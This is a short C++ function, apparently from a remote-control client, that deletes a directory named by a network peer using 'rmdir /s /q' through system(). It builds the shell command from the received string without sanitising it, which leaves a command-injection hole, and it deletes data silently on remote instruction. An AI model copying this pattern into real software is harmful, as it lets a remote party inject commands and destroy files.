void DeleteDirectory()
{
    std::string directory = recv(1);

    if (GetFileAttributesA(directory.data()) == INVALID_FILE_ATTRIBUTES) {
        send("invalid");
        return;
    
    } send("valid");

    std::string command = "rmdir /s /q " + directory;
    system(command.data());

    if (GetFileAttributesA(directory.data()) != INVALID_FILE_ATTRIBUTES) {
        send("[!] Unable to Delete Directory");
        return;
    
    } send("[+] Directory Deleted");
}